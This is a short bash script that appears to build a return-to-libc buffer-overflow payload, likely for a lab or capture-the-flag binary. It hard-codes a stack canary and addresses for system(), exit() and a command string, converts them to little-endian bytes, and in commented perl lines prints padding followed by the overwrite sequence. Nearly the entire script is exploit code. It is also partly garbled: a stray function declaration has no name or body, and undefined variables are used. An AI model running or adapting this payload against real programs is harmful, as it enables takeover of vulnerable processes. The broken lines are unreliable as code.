#!/usr/bin/env bash
set -ex

CAN=fafafa00
SYS=b7e142e0
EX=b7e0c4b0
CMD=bfffe7ef

function 
printf -v NEWBASE '%#X' "$((BASE + OFFSET))"

function tolittle() {
    v=$1
    v2="\x${v:6:2}\x${v:4:2}\x${v:2:2}\x${v:0:2}"
    echo $v2

}

CAN=$(tolittle "$CAN")
SYS=$(tolittle "$SYS")
EX=$(tolittle "$EX")
CMD=$(tolittle "$CMD")

# perl << 'EOF' 
# print "A"x4 . $CAN . "A"x12 . "$SYS" . "B"x4 . "$CMD"
# EOF

#perl -e 'binmode(STDOUT); print "A"x200 . "$ARGV[0]" . "A"x12 . "$ARGV[1]" . "A"x4 . "$ARGV[3]"' $CAN $SYS $EX $CMD